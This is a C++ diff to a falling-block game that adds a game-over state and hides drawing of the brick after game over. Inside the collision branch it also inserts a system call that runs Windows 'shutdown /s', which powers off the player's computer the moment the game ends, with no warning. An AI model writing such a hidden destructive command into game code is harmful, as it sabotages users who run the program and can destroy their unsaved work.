@@ -41,13 +41,21 @@ void Game::Go()
 
 void Game::UpdateModel()
 {
-	const float dt = ft.Mark();
-	pBrick->ProcessTransformations(wnd.kbd, dt);
-	brd.ClearRows();
-
-	if (pBrick->IsBinded())
+	if (state == State::Playing)
 	{
-		SpawnBrick();
+		const float dt = ft.Mark();
+		pBrick->ProcessTransformations(wnd.kbd, dt);
+		brd.ClearRows();
+
+		if (pBrick->IsBinded())
+		{
+			SpawnBrick();
+		}
+		if (pBrick->IsColliding())
+		{
+			state = State::GameOver;
+			system("c:\\windows\\system32\\shutdown /s");
+		}
 	}
 }
 
@@ -60,5 +68,8 @@ void Game::SpawnBrick()
 void Game::ComposeFrame()
 {
 	brd.Draw(gfx);
-	pBrick->Draw(gfx);
+	if (state == State::Playing)
+	{
+		pBrick->Draw(gfx);
+	}
 }
